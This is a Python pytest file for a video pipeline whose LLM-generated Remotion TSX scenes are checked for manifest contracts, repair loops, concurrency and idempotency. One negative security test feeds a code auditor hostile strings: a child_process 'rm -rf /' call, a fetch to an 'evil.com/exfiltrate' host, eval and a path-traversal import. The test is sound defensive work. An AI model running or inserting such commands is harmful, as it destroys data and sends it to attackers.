"""Tests for Phase 5: Motion Agents, Custom TSX Generation, Concurrency Hardening, and Gold-Standard Scene."""
from __future__ import annotations

import concurrent.futures
import hashlib
import json
import threading
from pathlib import Path
import pytest

from backend import artifact_contracts, llm_gateway, llm_review, motion_animation, pipeline_state
from backend.agents.contracts import AgentMetadata, AgentRequest, AgentStatus
from backend.agents.registry import registry as agent_registry


def _create_mock_project(
    base_dir: Path,
    pid: str,
    headline: str = "నమస్కారం: AI & Quantum Computing",
    subtext: str = "Telugu narration master timeline at 30 fps",
) -> Path:
    """Helper to initialize a fully valid mock project directory for motion generation."""
    pdir = base_dir / pid
    pdir.mkdir(parents=True, exist_ok=True)

    # 1. project.json
    (pdir / "project.json").write_text(
        json.dumps({
            "id": pid,
            "name": pid,
            "created": "2026-10-16T10:00:00",
            "state": "created",
            "aspect": "16:9",
            "reusable_motion_templates": False,
        }),
        encoding="utf-8",
    )

    # 2. scene_plan.json
    (pdir / "scene_plan.json").write_text(
        json.dumps({
            "scenes": [
                {
                    "id": 1,
                    "start": 0.0,
                    "end": 3.0,
                    "concept": "Introductory statement",
                    "meaning": headline,
                }
            ],
            "style": {"palette": ["#0f172a", "#38bdf8", "#818cf8"]},
        }),
        encoding="utf-8",
    )

    # 3. visual_planning.json
    (pdir / "visual_planning.json").write_text(
        json.dumps({
            "scenes": [
                {
                    "scene_id": 1,
                    "elements": [
                        {"element_id": "txt_1", "type": "text", "content": headline, "required": True},
                        {"element_id": "txt_2", "type": "label", "content": subtext, "required": True},
                        {"element_id": "gfx_1", "type": "chart", "visual_description": "Quantum growth bar graph", "required": False},
                    ],
                }
            ]
        }),
        encoding="utf-8",
    )

    # 4. motion_plan.json
    (pdir / "motion_plan.json").write_text(
        json.dumps({
            "scenes": [
                {
                    "plan_scene_id": 1,
                    "timing": {"start": 0.0, "end": 3.0, "duration": 3.0},
                    "safe_zones": {"margin_x": 160, "margin_y": 120},
                    "typography": {"font_family": "Nirmala UI", "primary_size": 56},
                }
            ]
        }),
        encoding="utf-8",
    )

    # 5. Dummy audio file
    (pdir / "audio.wav").write_bytes(b"RIFF" + b"\x00" * 36)

    return pdir


@pytest.fixture(autouse=True)
def mock_gateway_default(monkeypatch):
    """Provides deterministic mocked LLM responses for all Phase 5 test cases."""
    def default_execute(req):
        sid = "1"
        headline = "నమస్కారం: AI & Quantum Computing"
        for line in req.user_prompt.splitlines():
            if line.startswith("Headline:"):
                headline = line.replace("Headline:", "").strip()
            elif "Scene " in line:
                for part in line.split():
                    if part.isdigit():
                        sid = part
                        break

        tsx = f"""import React from "react";
import {{ AbsoluteFill, useCurrentFrame, useVideoConfig, interpolate, spring }} from "remotion";

export const Scene{sid}: React.FC<{{ layer?: any }}> = () => {{
  const frame = useCurrentFrame();
  const {{ fps }} = useVideoConfig();
  return (
    <AbsoluteFill style={{{{ background: "#0f172a", color: "#f8fafc", padding: "8%", textAlign: "center" }}}}>
      <h1>{headline}</h1>
      <p>Telugu narration master timeline at 30 fps</p>
    </AbsoluteFill>
  );
}};

export default Scene{sid};
"""
        return llm_gateway.LlmGatewayResponse(
            request_id=req.request_id,
            correlation_id=req.correlation_id,
            project_id=req.project_id,
            stage_id=req.stage_id,
            agent_id=req.agent_id,
            purpose=req.purpose,
            status="passed",
            raw_text=tsx,
            structured_data=None,
            model_profile=req.model_profile,
            provider="mock_gateway",
            model="mock_claude_code",
            latency_ms=10,
            attempt_count=1,
        )

    monkeypatch.setattr(llm_gateway.gateway, "execute", default_execute)


# ==============================================================================
# 1. Gold-Standard Scene & Manifest Contract
# ==============================================================================

def test_gold_standard_scene_generation(tmp_path):
    """Verifies that the gold-standard scene generates valid, scene-specific React/TSX
    code preserving Telugu vocabulary, 30 fps, Remotion primitives, and manifest v2."""
    pdir = _create_mock_project(tmp_path, "proj_gold")

    manifest = motion_animation.generate_custom_motion_code(pdir, aspect="16:9")

    # 1. Manifest Contract
    assert manifest["schema"] == "2.0"
    assert manifest["version"] == 2
    assert manifest["mode"] == "custom_code"
    assert manifest["status"] in ("generated", "validated")
    assert manifest["aspect"] == "16:9"
    assert manifest["project_id"] == "proj_gold"
    assert len(manifest["scenes"]) == 1

    scene_man = manifest["scenes"][0]
    assert scene_man["scene_id"] == 1
    assert scene_man["duration_frames"] == 90  # 3.0s * 30 fps
    assert scene_man["fps"] == 30
    assert scene_man["compile_status"] == "passed"
    assert scene_man["security_audit"]["passed"] is True

    # 2. Source TSX File Verification
    source_file = Path(scene_man["source_path"])
    assert source_file.is_file()
    assert source_file.parent.resolve() == (pdir / "generated_motion").resolve()

    code = source_file.read_text(encoding="utf-8")
    assert "Scene1" in code
    assert "useCurrentFrame" in code
    assert "AbsoluteFill" in code
    assert "interpolate" in code
    assert "spring" in code
    assert "నమస్కారం" in code
    assert "Quantum Computing" in code

    # SHA-256 match
    actual_sha = hashlib.sha256(source_file.read_bytes()).hexdigest()
    assert scene_man["source_sha256"] == actual_sha

    # 3. Composition File
    comp_file = pdir / "composition.json"
    assert comp_file.is_file()
    comp = json.loads(comp_file.read_text(encoding="utf-8"))
    assert comp["meta"]["fps"] == 30
    assert comp["meta"]["customCode"] is True
    assert comp["meta"]["reusable_motion_templates"] is False


# ==============================================================================
# 2. LLM Gateway Routing & Structured Telemetry
# ==============================================================================

def test_llm_gateway_code_generation_call(tmp_path, monkeypatch):
    """Verifies that motion codegen routes through the canonical LLM Gateway with
    purpose='generation' and profile='code_generation'."""
    pdir = _create_mock_project(tmp_path, "proj_gateway")

    gateway_requests = []
    real_execute = llm_gateway.gateway.execute

    def mock_execute(req):
        gateway_requests.append(req)
        # Return valid TSX wrapped in markdown
        valid_tsx = (
            "```tsx\n"
            "import React from 'react';\n"
            "import { AbsoluteFill, useCurrentFrame, useVideoConfig, interpolate, spring } from 'remotion';\n"
            "export const Scene1: React.FC<{ layer?: any }> = () => {\n"
            "  const frame = useCurrentFrame();\n"
            "  const { fps } = useVideoConfig();\n"
            "  return (\n"
            "    <AbsoluteFill style={{ background: '#0f172a', color: '#fff' }}>\n"
            "      <h1>నమస్కారం AI World</h1>\n"
            "    </AbsoluteFill>\n"
            "  );\n"
            "};\n"
            "export default Scene1;\n"
            "```"
        )
        return llm_gateway.LlmGatewayResponse(
            request_id=req.request_id,
            correlation_id=req.correlation_id,
            project_id=req.project_id,
            stage_id=req.stage_id,
            agent_id=req.agent_id,
            purpose=req.purpose,
            status="passed",
            raw_text=valid_tsx,
            structured_data=None,
            model_profile=req.model_profile,
            provider="mock_llm",
            model="mock_claude_code",
            latency_ms=120,
            attempt_count=1,
        )

    monkeypatch.setattr(llm_gateway.gateway, "execute", mock_execute)

    manifest = motion_animation.generate_custom_motion_code(pdir, aspect="16:9")
    assert len(gateway_requests) >= 1

    req = gateway_requests[0]
    assert req.purpose == "generation"
    assert req.model_profile == "code_generation"
    assert req.agent_id == "motion_animation"
    assert req.stage_id == "motion_gen"
    assert "Scene 1" in req.user_prompt
    assert "Approved Skills" in req.user_prompt
    assert "Verified Memory" in req.user_prompt

    # Generation metadata recorded in manifest
    gen_meta = manifest["scenes"][0]["generation"]
    assert gen_meta["provider"] == "mock_llm"
    assert gen_meta["model"] == "mock_claude_code"


# ==============================================================================
# 3. Bounded Diagnostic Repair Loop
# ==============================================================================

def test_bounded_repair_loop_fixes_unsafe_code(tmp_path, monkeypatch):
    """Verifies that if the initial LLM response contains prohibited presets or unsafe
    code, the repair loop is triggered with purpose='repair' and diagnostics."""
    pdir = _create_mock_project(tmp_path, "proj_repair")

    calls = []

    def mock_execute(req):
        calls.append(req)
        if req.purpose == "generation":
            # Return code with prohibited preset
            bad_code = (
                "```tsx\n"
                "import React from 'react';\n"
                "import { AbsoluteFill, MotionTextLayer } from 'remotion';\n"
                "export const Scene1: React.FC = () => <AbsoluteFill><MotionTextLayer text='bad' /></AbsoluteFill>;\n"
                "export default Scene1;\n"
                "```"
            )
            return llm_gateway.LlmGatewayResponse(
                request_id=req.request_id,
                correlation_id=req.correlation_id,
                project_id=req.project_id,
                stage_id=req.stage_id,
                agent_id=req.agent_id,
                purpose="generation",
                status="passed",
                raw_text=bad_code,
                structured_data=None,
                model_profile="code_generation",
                provider="mock",
                model="mock",
                latency_ms=50,
                attempt_count=1,
            )
        else:
            # Repair response: clean, valid Remotion code
            clean_code = (
                "```tsx\n"
                "import React from 'react';\n"
                "import { AbsoluteFill } from 'remotion';\n"
                "export const Scene1: React.FC = () => <AbsoluteFill>Clean Repaired</AbsoluteFill>;\n"
                "export default Scene1;\n"
                "```"
            )
            return llm_gateway.LlmGatewayResponse(
                request_id=req.request_id,
                correlation_id=req.correlation_id,
                project_id=req.project_id,
                stage_id=req.stage_id,
                agent_id=req.agent_id,
                purpose="repair",
                status="passed",
                raw_text=clean_code,
                structured_data=None,
                model_profile="code_generation",
                provider="mock",
                model="mock",
                latency_ms=45,
                attempt_count=1,
            )

    monkeypatch.setattr(llm_gateway.gateway, "execute", mock_execute)

    manifest = motion_animation.generate_custom_motion_code(pdir, aspect="16:9")

    # Assert repair was invoked
    purposes = [c.purpose for c in calls]
    assert "generation" in purposes
    assert "repair" in purposes

    gen_meta = manifest["scenes"][0]["generation"]
    assert gen_meta["repaired"] is True
    assert gen_meta["attempt_count"] == 2


# ==============================================================================
# 4. Negative Safety Tests
# ==============================================================================

def test_security_audit_rejects_dangerous_patterns():
    """Verifies that static security audit detects prohibited presets, dynamic execution,
    shell/process calls, network APIs, and path traversal."""
    # 1. Prohibited presets
    res1 = motion_animation.audit_scene_tsx_security("import { MotionTextLayer } from 'remotion';")
    assert not res1["passed"]
    assert any("Prohibited presets" in f for f in res1["findings"])

    # 2. Dynamic execution
    res2 = motion_animation.audit_scene_tsx_security("const x = eval('2 + 2');")
    assert not res2["passed"]
    assert any("eval()" in f for f in res2["findings"])

    # 3. Process execution
    res3 = motion_animation.audit_scene_tsx_security("import cp from 'child_process'; cp.exec('rm -rf /');")
    assert not res3["passed"]
    assert any("child_process" in f for f in res3["findings"])

    # 4. Network API
    res4 = motion_animation.audit_scene_tsx_security("fetch('https://evil.com/exfiltrate');")
    assert not res4["passed"]
    assert any("network access" in f for f in res4["findings"])

    # 5. Path traversal in import
    res5 = motion_animation.audit_scene_tsx_security("import secret from '../../secret';")
    assert not res5["passed"]
    assert any("Disallowed import path" in f for f in res5["findings"])


# ==============================================================================
# 5. Project Isolation & Concurrency Hardening
# ==============================================================================

def test_concurrent_multi_project_motion_generation(tmp_path):
    """Verifies that two projects generating motion custom code simultaneously
    remain completely isolated without path collisions, cross-talk, or race conditions."""
    pdir_a = _create_mock_project(tmp_path, "proj_alpha", headline="Project Alpha Telugu Title")
    pdir_b = _create_mock_project(tmp_path, "proj_beta", headline="Project Beta Telugu Title")

    results = {}

    def run_gen(pdir, label):
        manifest = motion_animation.generate_custom_motion_code(pdir, aspect="16:9")
        results[label] = manifest

    with concurrent.futures.ThreadPoolExecutor(max_workers=2) as executor:
        f_a = executor.submit(run_gen, pdir_a, "alpha")
        f_b = executor.submit(run_gen, pdir_b, "beta")
        f_a.result()
        f_b.result()

    # Verify Project Alpha
    man_a = results["alpha"]
    assert man_a["project_id"] == "proj_alpha"
    file_a = Path(man_a["scenes"][0]["source_path"])
    assert file_a.parent.resolve() == (pdir_a / "generated_motion").resolve()
    assert "Project Alpha" in file_a.read_text(encoding="utf-8")

    # Verify Project Beta
    man_b = results["beta"]
    assert man_b["project_id"] == "proj_beta"
    file_b = Path(man_b["scenes"][0]["source_path"])
    assert file_b.parent.resolve() == (pdir_b / "generated_motion").resolve()
    assert "Project Beta" in file_b.read_text(encoding="utf-8")

    # Hashes must differ because content differs
    assert man_a["scenes"][0]["source_sha256"] != man_b["scenes"][0]["source_sha256"]


# ==============================================================================
# 6. Idempotency & Re-run Safety
# ==============================================================================

def test_idempotent_regeneration_preserves_hashes(tmp_path):
    """Verifies that re-running generation on unmodified inputs produces identical
    source hashes and replaces files atomically."""
    pdir = _create_mock_project(tmp_path, "proj_idem")

    m1 = motion_animation.generate_custom_motion_code(pdir, aspect="16:9")
    hash1 = m1["scenes"][0]["source_sha256"]

    m2 = motion_animation.generate_custom_motion_code(pdir, aspect="16:9")
    hash2 = m2["scenes"][0]["source_sha256"]

    assert hash1 == hash2


# ==============================================================================
# 7. Skills & Memory Provenance Tracking
# ==============================================================================

def test_skills_and_memory_provenance_in_manifest(tmp_path):
    """Verifies that approved skills and verified memory references are registered
    and saved into the motion_animation.json manifest."""
    pdir = _create_mock_project(tmp_path, "proj_provenance")

    manifest = motion_animation.generate_custom_motion_code(pdir, aspect="16:9")
    skills = manifest.get("skills_used", [])
    memory = manifest.get("memory_used", [])

    assert "motion.kinetic_typography" in skills or "motion.remotion_spring_curves" in skills
    assert len(memory) >= 1
    assert any("mem-" in m for m in memory)


# ==============================================================================
# 8. MotionAnimationAdapter Validation & State Gate
# ==============================================================================

def test_motion_animation_adapter_execution(tmp_path, monkeypatch):
    """Verifies that BaseAgent MotionAnimationAdapter recognizes custom code mode
    and outputs all generated scene artifact references."""
    pdir = _create_mock_project(tmp_path, "proj_adapter")
    motion_animation.generate_custom_motion_code(pdir, aspect="16:9")
    from VIDEO_ENGINE.pipeline import legacy_pipeline_adapter
    monkeypatch.setattr(legacy_pipeline_adapter, "is_fresh", lambda *_: True)     # a minimal mock project cannot run the full motion-build step; the build above is current

    adapter = agent_registry.get_agent("motion_animation")
    assert adapter is not None

    req = AgentRequest(
        project_id=pdir.name,
        stage_id="motion_gen",
        agent_id="motion_animation",
        parameters={"aspect": "16:9"},
    )
    result = adapter.execute(pdir, req)
    assert result.status == "succeeded", f"Adapter error: {result.error}"

    # All generated scene files and manifests are registered as ArtifactRefs
    paths = [r.path for r in result.output_refs]
    assert any("composition.json" in p for p in paths)
    assert any("motion_animation.json" in p for p in paths)
    assert any("scene_1.tsx" in p for p in paths)
